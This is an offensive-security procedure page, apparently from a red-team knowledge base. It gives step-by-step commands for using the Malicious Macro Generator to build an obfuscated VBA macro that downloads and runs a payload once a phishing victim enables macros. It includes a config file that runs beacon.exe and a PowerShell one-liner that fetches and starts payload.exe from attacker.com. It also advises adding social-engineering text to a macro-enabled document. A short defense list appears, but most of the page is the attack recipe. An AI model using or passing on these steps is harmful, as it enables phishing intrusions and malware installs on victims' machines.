---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23Z'
updated_at: '2023-04-10T20:36:49Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Drive-by Compromise|T1189 - Drive-by Compromise]]'
  - '[[techniques/Scripting|T1064 - Scripting]]'
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques: []
tags:
  - office-attacks
  - vba-macro
  - malicious-macro-generator
  - payload-download
commands:
  - '[[commands/git-clone-malicious-macro-generator]]'
  - '[[commands/create-generic-command-config-for-mmg]]'
  - '[[commands/generate-vba-macro-with-mmg]]'
platforms:
  - Windows
tools:
  - '[[tools/MaliciousMacroGenerator]]'
validated: true
---

# Generate-Malicious-VBA-Macro-for-Payload-Download-and-Execution-Using-MMG

## Summary

This procedure uses the Malicious Macro Generator (MMG) tool to create an obfuscated VBA macro that, when embedded in an Office document, downloads a custom payload from a remote server and executes it upon user enablement of macros. It leverages social engineering to achieve initial access via drive-by compromise in trusted document formats.

## Description

The Malicious Macro Generator is a Python-based tool that automates the creation of malicious VBA code for Microsoft Office documents. This procedure configures MMG to generate a macro using a generic command execution template, which downloads an executable payload (e.g., beacon.exe) to a user-writable directory like C:\Users\Public\ and runs it via cmd.exe. The generated macro employs basic encoding evasion to bypass simple macro security checks. This technique targets Windows environments with Microsoft Office, relying on user execution of macros in phishing-delivered documents. Success grants the attacker a foothold for further post-exploitation. An alternative manual VBA implementation using URLDownloadToFile is available as [[codes/VBA-URLDownloadToFile-with-AutoOpen-for-Payload-Download]], but MMG provides better obfuscation.

## Requirements

1. A remote server hosting the payload executable (e.g., beacon.exe) accessible via HTTP.
2. Git and Python 3 installed on the attacker's machine (Kali Linux or similar).
3. Access to Microsoft Office for testing macro insertion (optional, for verification).
4. Basic knowledge of Office document manipulation for embedding the generated VBA.

## Defense

- Disable macros by default in Microsoft Office applications via group policy or settings.
- Educate users on the risks of enabling macros from untrusted sources, especially in email attachments.
- Implement application whitelisting (e.g., AppLocker or WDAC) to block execution of downloaded binaries from user directories.
- Enable Office macro logging and antivirus scanning for VBA content.
- Use email gateways to scan and block macro-enabled documents.

## Objectives

1. Generate obfuscated VBA code for payload delivery via Office macros.
2. Achieve initial access and execution on the target Windows machine.
3. Establish a foothold for data exfiltration or lateral movement.

## Instructions

### Step 1: Clone the MMG Repository

**Context**: Obtain the Malicious Macro Generator tool from GitHub to set up the local environment. This step ensures you have the necessary Python scripts and templates.

**Command** ([[commands/git-clone-malicious-macro-generator]]):
```bash
git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
```

> This clones the repository into the current directory. Verify by checking for the MMG.py file and configs/templates folders.

**Expected Output**: A new directory named MaliciousMacroGenerator containing MMG.py, configs, and templates.

### Step 2: Create the Generic Command Configuration File

**Context**: Define the payload behavior in a JSON config file, specifying the template, evasion techniques, and execution command. This configures MMG to generate a macro that downloads and runs the payload without advanced evasion.

**Command** ([[commands/create-generic-command-config-for-mmg]]):
```bash
cat > configs/generic-cmd.json << 'EOF'
{
    "description": "Generic command exec payload\nEvasion technique set to none",
    "template": "templates/payloads/generic-cmd-template.vba",
    "varcount": 152,
    "encodingoffset": 5,
    "chunksize": 180,
    "encodedvars": {},
    "vars": [],
    "evasion": ["encoder"],
    "payload": "cmd.exe /c C:\\Users\\Public\\beacon.exe"
}
EOF
```

> This creates the config file in the configs directory. Edit the "payload" field to customize the download URL and execution command if needed (e.g., powershell -c Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\Users\Public\payload.exe; Start-Process C:\Users\Public\payload.exe).

**Expected Output**: A file named generic-cmd.json in the configs directory with the specified JSON content. Verify with cat configs/generic-cmd.json.

### Step 3: Generate the Malicious VBA Macro

**Context**: Run MMG with the config to produce the obfuscated VBA code. This step outputs a .vba file ready for insertion into an Office document.

**Command** ([[commands/generate-vba-macro-with-mmg]]):
```bash
python MMG.py configs/generic-cmd.json malicious.vba
```

> Execute this from the MaliciousMacroGenerator directory. The tool processes the config, applies encoding, and generates the macro file.

**Expected Output**: A file named malicious.vba containing obfuscated VBA code that, when run, executes the payload command. The code will include variable encoding to evade basic detection.

### Step 4: Embed the Macro in an Office Document

**Context**: Insert the generated VBA into a legitimate-looking Word or Excel document to deliver via phishing. This step requires manual Office editing but completes the payload preparation.

**Instructions**: Open Microsoft Word or Excel, press Alt+F11 to open the VBA editor, insert a new module, and paste the contents of malicious.vba. Save the document as .docm or .xlsm (macro-enabled). Add social engineering text to prompt macro enablement.

**Expected Output**: A macro-enabled Office file (.docm/.xlsm) that triggers on open if macros are enabled.

**Success Indicators**:
- VBA code pastes without syntax errors.
- Test in a safe environment: Enabling macros downloads and attempts to execute the payload.
